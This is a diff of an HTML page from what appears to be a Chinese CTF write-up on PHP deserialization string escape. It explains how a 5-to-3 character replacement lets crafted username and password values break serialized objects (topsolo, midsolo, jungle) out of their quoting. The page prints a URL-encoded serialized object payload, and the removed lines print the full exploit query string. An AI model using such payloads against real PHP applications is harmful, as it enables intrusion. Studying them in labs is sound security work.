@@ -437,11 +437,11 @@
 <p>可以看到对象topsolo，midsolo被s:102，所包裹，我们要做的就是题目环境本身的替换字符操作从而达到对象topsolo，midsolo从引号的包裹中逃逸出来</p>
 <p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200906010548.png" alt=""></p>
 <p>在反序列化操作前，有个read的替换操作，字符数量从5位变成3位，合理构造username的长度，经过了read的替换操作后，最后将”;s:7:”\0\0pass”;s:126吃掉，需要吃掉的长度为23，因为5-&gt;3，所以得为2的倍数，需要在password中再填充一个字符C，变成24位，所以我们一共需要构造12个\0\0来进行username填充，得到username</p>
-<p>username=\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/52352.jpg" alt=""></p>
 <p>在password中补上被吃掉的pass部分，构造password的提交内容</p>
 <p>password=C”;s:7:”\0*\0pass”;O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
 <p>最后</p>
-<p>?username=\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0&amp;password=C”;s:7:”\0*\0pass”;O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6e\61\6d\65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/re.jpg" alt=""></p>
 <p>flag在play.php。</p>
 
         </div>
